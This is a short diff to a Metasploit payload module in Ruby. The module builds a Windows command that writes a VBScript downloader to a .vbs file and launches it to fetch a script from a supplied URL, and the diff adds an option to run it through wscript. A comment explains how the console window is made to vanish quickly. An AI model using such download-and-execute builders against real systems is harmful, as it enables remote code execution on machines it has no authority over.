@@ -40,6 +40,7 @@ module Metasploit3
 			[
 				OptString.new('URL', [ true, "The pre-encoded URL to the script" ]),
 				OptBool.new('INCLUDECMD', [ true, "Include the cmd /q /c", false ]),
+				OptBool.new('INCLUDEWSCRIPT', [ true, "Include the wscript command", false ]),
 				OptBool.new('DELETE', [ true, "Delete created .vbs after download", false ])
 			], self.class)
 	end
@@ -64,7 +65,9 @@ module Metasploit3
 		# "start #{vbsname}.vbs" instead of just "#{vbsname}.vbs" so that the console window
 		# disappears quickly before the wscript libraries load and the file downloads
 		command << " >#{vbsname}.vbs"+
-			"&start #{vbsname}.vbs"
+			"&start "
+		command << "wscript " if datastore['INCLUDEWSCRIPT']
+		command << "#{vbsname}.vbs"
 	end
 end
 
